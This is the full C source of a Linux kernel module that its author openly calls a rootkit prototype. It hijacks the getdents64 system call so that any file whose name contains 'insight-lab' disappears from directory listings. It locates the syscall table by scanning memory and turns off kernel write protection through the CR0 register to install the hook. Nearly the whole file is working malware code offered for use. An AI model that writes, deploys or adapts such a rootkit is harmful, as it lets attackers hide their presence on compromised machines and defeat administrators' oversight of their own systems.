/* This is a prototype of linux kernel rootkit. An old school way make it possible to
 *  * hide a specific file via hijacking system call.
 *   *  
 *    * Happy hacking, Fellows!
 *     *
 *      *
 *       * monkey-coder: Shawn the R0ck@copyleft, <citypw@gmail.com>
 *        * 
 *         * I tested it under 3.13 and it works fine.
 *          * 
 *           * This code is also GPL'ed!
 *            *
 * * * * * * * */

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <asm/fcntl.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/sched.h>	/* fcheck_files? */
#include <linux/fdtable.h>
#include <linux/slab.h>		/* kmalloc() */

unsigned long **sys_call_table;

asmlinkage long (*orig_getdents64) (unsigned int fd,
				    struct linux_dirent64 __user * dirent,
				    unsigned int count);

char HIDE_FILE[] = "insight-lab";


asmlinkage long hacked_getdents64(unsigned int fd,
				  struct linux_dirent64 __user * dirent,
				  unsigned int count)
{
	unsigned int n_files, hide_file=0;
	int t;
	struct linux_dirent64 *dirp2, *dirp3;

	/* call original function*/
	n_files = (*orig_getdents64) (fd, dirent, count);
	if (!n_files)
		return 0;

	dirp2 = (struct linux_dirent64*) kmalloc(n_files, GFP_KERNEL);
	if( !dirp2)
		return dirp2;

	copy_from_user(dirp2, dirent, n_files);

	dirp3 = dirp2;
	t = n_files;

	while( t > 0){
		/* d_reclen is a member of struct linux_dirent64, it's size of current linux_dirent64*/
		t -= dirp3->d_reclen;
		hide_file = 1;

		if( strstr(dirp3->d_name, HIDE_FILE) != NULL){
			printk(KERN_INFO "Matched: hiding the file: %s...\n", dirp3->d_name);
			/* not allow to display the file */
			n_files -= dirp3->d_reclen;
			hide_file = 0;
			
			/* overlapping the dirp3 */
			if( t)
				memmove(dirp3, (char*) dirp3 + dirp3->d_reclen, t);
		}

		/* search for the next linux_dirent64 */
		if(t && hide_file)
			dirp3 = (struct linux_dirent64*) ((char*) dirp3 + dirp3->d_reclen);
	//	printk(KERN_INFO "Basic info: tmp = %d, d_inode = %d, d_offset = %d, d_reclen = %u, d_name = %s\n",
	//			t, dirp3->d_ino, dirp3->d_off, dirp3->d_reclen, dirp3->d_name);
	}
	
	copy_to_user((void*) dirent, (void*) dirp2, n_files);
	kfree(dirp2);

	return n_files;		/*everything is ok, but the new systemcall
				   does nothing */
}

static unsigned long **get_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;	// 0xc0000000 by default
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **) offset;

		if (sct[__NR_close] == (unsigned long *) sys_close)
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

static void disable_wp_protection(void)
{
	unsigned long value;
	asm volatile ("mov %%cr0, %0":"=r" (value));

	if (!(value & 0x00010000))
		return;

	asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
}

static void enable_wp_protection(void)
{
	unsigned long value;
	asm volatile ("mov %%cr0, %0":"=r" (value));

	if ((value & 0x00010000))
		return;

	asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
}

int hide_file_init(void)
{				/*module setup */
	if (!(sys_call_table = get_sys_call_table())) {
		printk(KERN_INFO "request sys_call_table failed!\n");
		return -1;
	}

	disable_wp_protection();
	orig_getdents64 = sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = hacked_getdents64;
	enable_wp_protection();
	return 0;
}

void hide_file_exit(void)
{				/*module shutdown */
	disable_wp_protection();
	sys_call_table[__NR_getdents64] = orig_getdents64;	/*set getdents64 syscall to the origal
								   one */
	enable_wp_protection();
}

module_init(hide_file_init);
module_exit(hide_file_exit);
MODULE_LICENSE("GPL");
